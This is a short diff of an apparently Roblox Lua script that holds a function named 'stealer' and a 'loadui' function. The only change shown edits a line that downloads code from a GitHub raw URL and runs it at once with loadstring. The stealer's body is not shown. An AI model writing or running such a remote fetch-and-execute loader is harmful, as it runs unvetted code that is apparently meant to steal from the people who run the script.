@@ -3,7 +3,7 @@ local function stealer()
 end
 
 local function loadui()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/SkeboberScript/Roblox_Scripts/refs/heads/main/dsadads"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/SkeboberScript/Roblox_Scripts/refs/heads/main/dsadads.lua"))()
 
 end
 
